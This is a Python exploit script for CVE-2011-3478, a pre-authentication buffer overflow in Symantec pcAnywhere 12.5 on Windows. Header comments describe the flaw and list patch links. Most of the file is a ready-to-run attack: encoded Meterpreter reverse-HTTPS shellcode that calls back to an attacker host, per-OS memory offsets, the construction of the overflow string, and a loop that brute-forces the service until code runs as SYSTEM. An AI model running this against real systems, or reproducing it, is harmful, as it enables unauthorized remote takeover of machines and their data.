#!/usr/bin/python

################################################################
# Exploit Title: Symantec pcAnywhere v12.5.0 Windows x86 RCE
# Date: 2015-10-31
# Exploit Author: Tomislav Paskalev
# Vendor Homepage: https://www.symantec.com/
# Software Link: http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
#   Version: Symantec pcAnywhere v12.5.0 Build 442 (Trial)
# Vulnerable Software:
#   Symantec pcAnywhere 12.5.x through 12.5.3
#   Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)
# Tested on:
#   Symantec pcAnywhere v12.5.0 Build 442 (Trial)
#   --------------------------------------------
#   Microsoft Windows Vista Ultimate SP1 x86 EN
#   Microsoft Windows Vista Ultimate SP2 x86 EN
#   Microsoft Windows 2008 Enterprise SP2 x86 EN
#   Microsoft Windows 7 Professional SP1 x86 EN
#   Microsoft Windows 7 Ultimate SP1 x86 EN
# CVE ID: 2011-3478
# OSVDB-ID: 78532
################################################################
# Vulnerability description:
#   The application's module used for handling incoming connections
#   (awhost32.exe) contains a flaw. When handling authentication
#   requests, the vulnerable process copies user provided input
#   to a fixed length buffer without performing a length check.
#   A remote unauthenticated attacker can exploit this vulnerability
#   to cause a buffer overflow and execute arbitrary code in the
#   context of the exploited application (installed as a service
#   by default, i.e. with "NT AUTHORITY\SYSTEM" privileges).
################################################################
# Target application notes:
#   - the application processes one login attempt at a time
#     (i.e. multiple parallel login requests are not possible)
#   - available modules (interesting exploit wise):
#     Name         | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
#    -------------------------------------------------------------
#     awhost32.exe | False  | False   | False |  False   | False
#     ijl20.dll    | False  | False   | False |  False   | False
#     IMPLODE.DLL  | False  | False   | False |  False   | False
#    -------------------------------------------------------------
#   - supported Windows x86 operating systems (pcAnywhere v12.5)
#       - Windows 2000
#       - Windows 2003 Server
#       - Windows 2008 Server
#       - Windows XP
#       - Windows Vista
#       - Windows 7
################################################################
# Exploit notes:
#   - bad characters: "\x00"
#   - Windows Vista, Windows 2008 Server, Windows 7
#     - after a shellcode execution event occurs, the
#       application does not crash and remains fully functional
#       - one successful shellcode execution event has a low
#         success rate (applies to all OSes)
#         - in order to achieve an overall more reliable exploit,
#           multiple shellcode executions need to be performed
#           (until the shellcode is successfully executed)
#           - brute force is a feasible method 
#             - multiple parallel brute force attacks are not possible
#   - multiple valid offsets are available (i.e. not just the
#     ones tested)
################################################################
# Test notes:
#   - all tested OSes
#     - clean default installations
#   - all OS specific statistics referenced in the exploit are
#     based on the test results of 10 attempts per tested offset
#     - all attempts were performed after a system reboot (VM)
#     - the provided test results should be taken only as a rough guide
#       - in practice it might occur that the number of attempts
#         needed to achieve successful exploitation is (much)
#         higher than the maximum value contained in the test
#         results, or that the exploit does not succeed at all
#         - other (untested) offsets might provide better results
#   - not letting the OS and application load fully/properly before
#     starting the exploit may lead to failed exploitation (this
#     observation was made during the testing of the exploit and
#     applies mostly to Windows 7)
################################################################
# Patch:
#   https://support.symantec.com/en_US/article.TECH179526.html
#   https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
################################################################
# Thanks to:
#   Tal zeltzer (discovered the vulnerability)
#   S2 Crew (Python PoC)
################################################################
# In memoriam:
#   msfpayload | msfencode  [2005 - 2015]
################################################################
# References:
#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
#   http://www.zerodayinitiative.com/advisories/ZDI-12-018/
#   https://www.exploit-db.com/exploits/19407/
################################################################


import socket
import time
import struct
import string
import sys




################################
###  HARDCODED TARGET INFO   ###
################################


# target server info
# >>> MODIFY THIS >>>
targetServer = "192.168.80.227"
targetPort   = 5631


# Supported operating systems
vistaUltSP1  = {
    'Version': 'Microsoft Windows Vista Ultimate SP1 x86 EN',
    'Offset': 0x03e60000,
    'PasswordStringLength': 3500,
    'TestAttempts': [8, 62, 35, 13, 8, 7, 11, 23, 8, 10]
};
vistaUltSP2  = {
    'Version': 'Microsoft Windows Vista Ultimate SP2 x86 EN',
    'Offset': 0x03e60000,
    'PasswordStringLength': 3500,
    'TestAttempts': [16, 27, 13, 17, 4, 13, 7, 9, 5, 16]
};
s2k8EntSP2   = {
    'Version': 'Microsoft Windows 2008 Enterprise SP2 x86 EN',
    'Offset': 0x03dd0000,
    'PasswordStringLength': 3500,
    'TestAttempts': [25, 5, 14, 18, 66, 7, 8, 4, 4, 24]
};
sevenProSP1  = {
    'Version': 'Microsoft Windows 7 Professional SP1 x86 EN',
    'Offset': 0x03a70000,
    'PasswordStringLength': 3500,
    'TestAttempts': [188, 65, 25, 191, 268, 61, 127, 136, 18, 98]
};
sevenUltSP1  = {
    'Version': 'Microsoft Windows 7 Ultimate SP1 x86 EN',
    'Offset': 0x03fa0000,
    'PasswordStringLength': 3500,
    'TestAttempts': [23, 49, 98, 28, 4, 31, 4, 42, 50, 42]
};


# target server OS
# >>> MODIFY THIS >>>
#OSdictionary = vistaUltSP1
#OSdictionary = vistaUltSP2
#OSdictionary = s2k8EntSP2
#OSdictionary = sevenProSP1
OSdictionary = sevenUltSP1


# timeout values
shellcodeExecutionTimeout = 30


# client-server handshake
initialisationSequence = "\x00\x00\x00\x00"
handshakeSequence      = "\x0d\x06\xfe"


# username string
usernameString         = "U" * 175


# shellcode
# available shellcode space: 1289 bytes
# shellcode generated with Metasploit Framework Version: 4.11.4-2015090201 (Kali 2.0)
# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.80.223 LPORT=443 EXITFUNC=seh -e x86/shikata_ga_nai -b '\x00' -f python -v shellcode
# >>> MODIFY THIS >>>
shellcode =  ""
shellcode += "\xda\xd3\xd9\x74\x24\xf4\xbf\x2c\x46\x39\x97\x5d"
shellcode += "\x33\xc9\xb1\x87\x83\xed\xfc\x31\x7d\x14\x03\x7d"
shellcode += "\x38\xa4\xcc\x6b\xa8\xaa\x2f\x94\x28\xcb\xa6\x71"
shellcode += "\x19\xcb\xdd\xf2\x09\xfb\x96\x57\xa5\x70\xfa\x43"
shellcode += "\x3e\xf4\xd3\x64\xf7\xb3\x05\x4a\x08\xef\x76\xcd"
shellcode += "\x8a\xf2\xaa\x2d\xb3\x3c\xbf\x2c\xf4\x21\x32\x7c"
shellcode += "\xad\x2e\xe1\x91\xda\x7b\x3a\x19\x90\x6a\x3a\xfe"
shellcode += "\x60\x8c\x6b\x51\xfb\xd7\xab\x53\x28\x6c\xe2\x4b"
shellcode += "\x2d\x49\xbc\xe0\x85\x25\x3f\x21\xd4\xc6\xec\x0c"
shellcode += "\xd9\x34\xec\x49\xdd\xa6\x9b\xa3\x1e\x5a\x9c\x77"
shellcode += "\x5d\x80\x29\x6c\xc5\x43\x89\x48\xf4\x80\x4c\x1a"
shellcode += "\xfa\x6d\x1a\x44\x1e\x73\xcf\xfe\x1a\xf8\xee\xd0"
shellcode += "\xab\xba\xd4\xf4\xf0\x19\x74\xac\x5c\xcf\x89\xae"
shellcode += "\x3f\xb0\x2f\xa4\xad\xa5\x5d\xe7\xb9\x57\x3b\x6c"
shellcode += "\x39\xc0\xb4\xe5\x57\x79\x6f\x9e\xeb\x0e\xa9\x59"
shellcode += "\x0c\x25\x84\xbe\xa1\x95\xb4\x13\x16\x72\x01\xc2"
shellcode += "\xe1\x25\x8a\x3f\x42\x79\x1f\xc3\x37\x2e\xb7\x78"
shellcode += "\xb6\xd0\x47\x97\x86\xd1\x47\x67\xd9\x84\x3f\x54"
shellcode += "\x6e\x11\x95\xaa\x3a\x37\x6f\xa8\xf7\xbe\xf8\x1d"
shellcode += "\x4c\x16\x73\x50\x25\xc2\x0c\xa6\x91\xc1\xb0\x8b"
shellcode += "\x53\x69\x76\x22\xd9\x46\x0a\x1a\xbc\xea\x87\xf9"
shellcode += "\x09\xb2\x10\xcf\x14\x3c\xd0\x56\xb3\xc8\xba\xe0"
shellcode += "\x69\x5a\x3a\xa2\xff\xf0\xf2\x73\x92\x4b\x79\x10"
shellcode += "\x02\x3f\x4f\xdc\x8f\xdb\xe7\x4f\x6d\x1d\xa9\x1d"
shellcode += "\x42\x0c\x70\x80\xcc\xe9\xe5\x0a\x55\x80\x8a\xc2"
shellcode += "\x3d\x2a\x2f\xa5\xe2\xf1\xfe\x7d\x2a\x86\x6b\x08"
shellcode += "\x27\x33\x2a\xbb\xbf\xf9\xd9\x7a\x7d\x87\x4f\x10"
shellcode += "\xed\x0d\x1b\xad\x88\xc6\xb8\x50\x07\x6a\x74\xf1"
shellcode += "\xd3\x2d\xd9\x84\x4e\xc0\x8e\x25\x23\x76\x60\xc9"
shellcode += "\xb4\xd9\xf5\x64\x0e\x8e\xa6\x22\x05\x39\x3f\x98"
shellcode += "\x96\x8e\xca\x4f\x79\x54\x64\x26\x33\x3d\xe7\xaa"
shellcode += "\xa2\xb1\x90\x59\x4b\x74\x1a\xce\xf9\x0a\xc6\xd8"
shellcode += "\xcc\x99\x49\x75\x47\x33\x0e\x1c\xd5\xf9\xde\xad"
shellcode += "\xa3\x8c\x1e\x02\x3b\x38\x96\x3d\x7d\x39\x7d\xc8"
shellcode += "\x47\x95\x16\xcb\x75\xfa\x63\x98\x2a\xa9\x3c\x4c"
shellcode += "\x9a\x25\x28\x27\x0c\x8d\x51\x1d\xc6\x9b\xa7\xc1"
shellcode += "\x8e\xdb\x8b\xfd\x4e\x55\x0b\x97\x4a\x35\xa6\x77"
shellcode += "\x04\xdd\x43\xce\x36\x9b\x53\x1b\x15\xf7\xf8\xf7"
shellcode += "\xcf\x9f\xd3\xf1\xf7\x24\xd3\x2b\x82\x1b\x5e\xdc"
shellcode += "\xc3\xee\x78\x34\x90\x10\x7b\xc5\x4c\x51\x13\xc5"
shellcode += "\x80\x51\xe3\xad\xa0\x51\xa3\x2d\xf3\x39\x7b\x8a"
shellcode += "\xa0\x5c\x84\x07\xd5\xcc\x28\x21\x3e\xa5\xa6\x31"
shellcode += "\xe0\x4a\x37\x61\xb6\x22\x25\x13\xbf\x51\xb6\xce"
shellcode += "\x3a\x55\x3d\x3e\xcf\x51\xbf\x03\x4a\x9d\xca\x66"
shellcode += "\x0c\xdd\x6a\x81\xdb\x1e\x6b\xae\x12\xd8\xa6\x7f"
shellcode += "\x65\x2c\xff\x51\xbd\x60\xd1\x9f\x8f\xb3\x2d\x5b"
shellcode += "\x11\xbd\x1f\x71\x87\xc2\x0c\x7a\x82\xa9\xb2\x47"




################################
###     BUFFER OVERFLOW      ###
###   STRING CONSTRUCTION    ###
################################


# Calculate address values based on the OS offset
pointerLocationAddress    = OSdictionary['Offset'] + 0x00005ad8
pointerForECXplus8Address = OSdictionary['Offset'] + 0x00005ad4
breakPointAddress         = OSdictionary['Offset'] + 0x000065af - 0x00010000


# jump over the next 38 bytes (to the begining of the shellcode)
jumpToShellcode    = "\xeb\x26\x90\x90"

# pointerLocationAddress - the memory address location of the "pointerForECXplus8" variable
pointerLocation    = struct.pack('<L', pointerLocationAddress)

# CALL ESI from the application module ijl20.dll [aslr=false,rebase=false,safeseh=false]
callESI            = struct.pack('<L', 0x67f7ab23)

# pointerForECXplus8Address - the memory address location of the start of the DDDD string in the shellcode (Offset + 0x00005acc + 0x8)
pointerForECXplus8 = struct.pack('<L', pointerForECXplus8Address)


# construct the password string which will cause a buffer overflow condition and exploit the vulnerability
passwordString = (
    "A" * 945 +
    jumpToShellcode +
    pointerLocation +
    "D" * 4 +
    pointerForECXplus8 +
    callESI +
    "\x90" * 20 +
    shellcode +
    "I" * (1289 - len(shellcode)) +
    "\xaa" * (OSdictionary['PasswordStringLength'] - 945 - 4 * 5 - 20 - 1289)
)




################################
###        FUNCTIONS         ###
################################


# calculate and return the median value of the argument list
def calculateMedian(targetList):
    sortedTargetList = sorted(targetList)
    targetListLength = len(targetList)
    medianIndex = (targetListLength - 1) / 2

    if (targetListLength % 2):
        return sortedTargetList[medianIndex]
    else:
        return ((sortedTargetList[medianIndex] + sortedTargetList[medianIndex + 1]) / 2)



# print an indented line with a type prefix
def printLine(infoType, indentDepth, textToDisplay):

    # [I]nformational
    if infoType == "I":
        print ('    ' * indentDepth),
        print "\033[1;37m[*]\033[1;m", textToDisplay

    # [E]rror
    elif infoType == "E":
        print ('    ' * indentDepth),
        print "\033[1;31m[-]\033[1;m", textToDisplay

    # [S]uccess
    elif infoType == "S":
        print ('    ' * indentDepth),
        print "\033[1;32m[+]\033[1;m", textToDisplay

    # [W]arning
    elif infoType == "W":
        print ('    ' * indentDepth),
        print "\033[1;33m[!]\033[1;m", textToDisplay

    # [N]one
    elif infoType == "N":
        print ('    ' * indentDepth),
        print textToDisplay



# print the banner - general exploit info, target info, target OS statistics
def printBanner():
    printLine ("I", 0, "Symantec pcAnywhere v12.5.0 Build 442 Login+Password field")
    printLine ("N", 1, "Buffer Overflow Remote Code Execution exploit (CVE-2011-3478)")
    printLine ("I", 1, "by Tomislav Paskalev")

    printLine ("I", 0, "Target server information")
    printLine ("I", 1, "IP address            : " + targetServer)
    printLine ("I", 1, "Port                  : " + str(targetPort))

    printLine ("I", 0, "Exploit target information")
    printLine ("I", 1, "Target OS             : " + OSdictionary['Version'])
    printLine ("I", 2, "Offset            : " + "{:#010x}".format(OSdictionary['Offset']))
    printLine ("I", 2, "Breakpoint (test) : " + "{:#010x}".format(breakPointAddress))
    printLine ("I", 2, "Password length   : " + str(OSdictionary['PasswordStringLength']))
    printLine ("I", 2, "Test result stats")
    printLine ("I", 3, "Test count    : " + str(len(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Reliability   : " + str(((len(OSdictionary['TestAttempts']) - OSdictionary['TestAttempts'].count(0)) * 100) / len(OSdictionary['TestAttempts'])) + "%")
    printLine ("I", 3, "Min attempt   : " + str(min([element for element in OSdictionary['TestAttempts'] if element > 0])))
    printLine ("I", 3, "Max attempt   : " + str(max(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Avg attempt   : " + str(sum(OSdictionary['TestAttempts']) / len(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Median attempt: " + str(calculateMedian(OSdictionary['TestAttempts'])))



# connect to the server and return the socket
def connectToServer(server, port):
    # create socket
    targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        targetSocket.connect((server, port))
    except socket.error as msg:
        if "[Errno 111] Connection refused" in str(msg):
            return None
    # return the opened socket
    return targetSocket



# send the data to the server and return the response
def sendDataToServer(destSocket, dataToSend):
    destSocket.send(dataToSend)
    try:
        receivedData = destSocket.recv(1024)
    except socket.error as msg:
        if "[Errno 104] Connection reset by peer" in str(msg):
            return None
    return receivedData



# run the exploit; exits when finished or interrupted
def runExploit():
    printLine ("I", 0, "Starting exploit...")

    attemptCounter = 0

    # brute force the service until the shellcode is successfully executed
    while True:
        # connect to the target server
        openSocket = connectToServer(targetServer, targetPort)

        attemptCounter += 1
        sleepTimer = 0

        printLine ("I", 1, "Attempt no. " + str(attemptCounter))
        printLine ("I", 2, "Sending initialisation sequence...")

        # send the data; check outcome
        while True:
            receivedData = sendDataToServer(openSocket, initialisationSequence)
            # check if server responded properly, if yes exit the loop
            if receivedData:
                if "Please press <Enter>..." in receivedData:
                    break
            # exit if the service is unavailable
            if attemptCounter == 1:
                printLine ("E", 3, "Service unavailable")
                printLine ("I", 4, "Exiting...")
                exit(1)
            # check if shellcode executed (based on a timer)
            if sleepTimer > shellcodeExecutionTimeout:
                print ""
                printLine ("S", 4, "Shellcode executed after " + str(attemptCounter - 1) + " attempts")
                printLine ("I", 5, "Exiting...")
                exit(1)

            # print waiting ticks
            sys.stdout.write('\r')
            sys.stdout.write("             \033[1;33m[!]\033[1;m Connection reset - reinitialising%s" % ('.' * sleepTimer))
            sys.stdout.flush()

            # sleep one second and reconnect
            time.sleep(1)
            sleepTimer += 1

            openSocket.close()
            openSocket = connectToServer(targetServer, targetPort)

        if sleepTimer > 0:
            print ""

        printLine ("I", 2, "Sending handshake sequence...")
        openSocket.send(handshakeSequence)
        time.sleep(3)
        data = openSocket.recv(1024)
 
        printLine ("I", 2, "Sending username...")
        openSocket.send(usernameString)
        time.sleep(3)
 
        printLine ("I", 2, "Sending password...")
        openSocket.send(passwordString)
        openSocket.close()
        time.sleep(3)



# main function
if __name__ == "__main__":
    printBanner()
    try:
        runExploit()
    except KeyboardInterrupt:
        print ""
        sys.exit()


# End of file
